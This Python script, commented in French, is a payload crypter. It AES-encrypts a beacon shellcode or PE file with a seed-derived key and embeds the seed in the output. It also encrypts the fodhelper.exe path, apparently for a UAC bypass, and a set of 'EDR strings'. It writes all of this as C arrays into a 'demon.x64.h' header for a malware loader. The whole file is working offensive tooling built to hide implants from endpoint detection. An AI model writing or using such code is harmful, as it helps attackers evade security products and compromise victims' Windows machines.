#!/usr/bin/env python3

import os
import secrets
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

def generate_seed_derive_key(seed_bytes):
    salt_hash = hashes.Hash(hashes.SHA256(), backend=default_backend())
    salt_hash.update(seed_bytes[:16])
    derived_salt = salt_hash.finalize()[:16]

    kdf = PBKDF2HMAC(hashes.SHA256(), 48, derived_salt, 100000)
    key_iv = kdf.derive(seed_bytes)

    return key_iv[:32], key_iv[32:], derived_salt

def format_c_array(data):
    lines = []
    for i in range(0, len(data), 12):
        line = ', '.join(f"0x{b:02x}" for b in data[i:i+12])
        lines.append(f"    {line}")
    return ',\n'.join(lines)

def preview_hex(data, name):
    if len(data) == 0:
        return f"{name}: [vide]"
    first8 = data[:8].hex()
    last8 = data[-8:].hex()
    return f"{name}: {len(data)}b [{first8}...{last8}]"

def load_edr_strings(config_file):
    """Charge les strings à chiffrer depuis edr_strings.conf"""
    if not os.path.exists(config_file):
        print(f"❌ {config_file} manquant (obligatoire)")
        exit(1)

    edr_strings = {}
    try:
        with open(config_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if ':' in line:
                    key, value = line.split(':', 1)
                    edr_strings[key.strip()] = value.strip()
        print(f"[+] {len(edr_strings)} strings EDR chargées")
        return edr_strings
    except Exception as e:
        print(f"[-] Erreur lecture {config_file}: {e}")
        return edr_strings

def encrypt_string(plaintext_str, cipher_obj):
    """Chiffre une string sans seed"""
    plaintext = plaintext_str.encode('utf-8')
    pad_len = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad_len] * pad_len)

    encryptor = cipher_obj.encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    return ciphertext

def encrypt_with_seed(input_file, output_file, edr_config_file=None):
    if not os.path.exists(input_file):
        print(f"❌ {input_file} introuvable")
        return False

    with open(input_file, 'rb') as f:
        plaintext = f.read()

    seed = secrets.token_bytes(42)
    key, iv, salt = generate_seed_derive_key(seed)

    print(f"[+] seed (42 bytes): {seed.hex()}")
    print(f"[+] salt (dyn): {salt.hex()}")
    print(f"[+] key (aes256): {key.hex()}")
    print(f"[+] iv (cbc): {iv.hex()}")

    print("")

    print(preview_hex(plaintext, f"[+] {os.path.basename(input_file)}"))
    print(f"[+] Plaintext first 16b: {plaintext[:16].hex()}")

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    pad_len = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad_len] * pad_len)
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    final_payload = seed + ciphertext  # ← SEED + cipher

    print(preview_hex(final_payload, "[+] payload_enc"))

    # Charger et chiffrer les strings EDR supplémentaires
    edr_strings = load_edr_strings(edr_config_file) if edr_config_file else {}

    # Si fodhelper_path est dans edr_strings, l'utiliser. Sinon, garder l'ancien hardcoded
    if 'fodhelper_path' in edr_strings:
        fod_plain = edr_strings['fodhelper_path'].encode('utf-8')
    else:
        fod_plain = b"C:\\Windows\\System32\\fodhelper.exe"

    pad_len_fod = 16 - (len(fod_plain) % 16)
    padded_fod = fod_plain + bytes([pad_len_fod] * pad_len_fod)

    encryptor_fod = cipher.encryptor()
    cipher_fod = encryptor_fod.update(padded_fod) + encryptor_fod.finalize()
    fodhelper_enc = cipher_fod  # ← UNIQUEMENT cipher

    print(preview_hex(fodhelper_enc, "[+] fodhelper_enc"))

    if output_file:
        with open(output_file, 'wb') as f:
            f.write(final_payload)
        print(f"[+] Payload écrit dans {output_file}")
    else:
        print("[*] Pas de fichier output, demon.x64.h créé uniquement")

    payload_array = format_c_array(final_payload)
    fod_array = format_c_array(fodhelper_enc)

    # Charger et chiffrer les strings EDR supplémentaires
    edr_strings = load_edr_strings(edr_config_file) if edr_config_file else {}
    edr_declarations = ""

    if edr_strings:
        print(f"\n=== Chiffrement des strings EDR ===")
        for var_name, plaintext_str in edr_strings.items():
            # Sauter fodhelper_path (géré séparément plus haut)
            if var_name == 'fodhelper_path':
                continue
            enc_data = encrypt_string(plaintext_str, cipher)
            enc_array = format_c_array(enc_data)
            print(preview_hex(enc_data, f"[+] {var_name}_enc"))

            edr_declarations += f"\nstatic unsigned char {var_name}_enc[] = {{\n{enc_array}\n}};\n"
            edr_declarations += f"static const size_t {var_name}_enc_len = {len(enc_data)};\n"

    header_content = f"""// demon.x64.h - PAYLOAD + FODHELPER + EDR STRINGS (SEED dans payload UNIQUEMENT)
// Généré automatiquement

#ifndef DEMON_X64_H
#define DEMON_X64_H

static unsigned char payload_enc[] = {{
{payload_array}
}};
static unsigned int payload_enc_len = {len(final_payload)};

static unsigned char fodhelper_enc[] = {{
{fod_array}
}};
static const size_t fodhelper_enc_len = {len(fodhelper_enc)};
{edr_declarations}
#endif
"""

    with open("demon.x64.h", 'w') as f:
        f.write(header_content)

    print("")
    print(f"[+] demon.x64.h généré")
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='aes encryption')
    parser.add_argument('-i', '--input', required=True, help='beacon pe/shellcode')
    parser.add_argument('-o', '--output', required=False, help='payload chiffré (optionnel)')
    args = parser.parse_args()

    success = encrypt_with_seed(args.input, args.output, 'edr_strings.conf')
    exit(0 if success else 1)
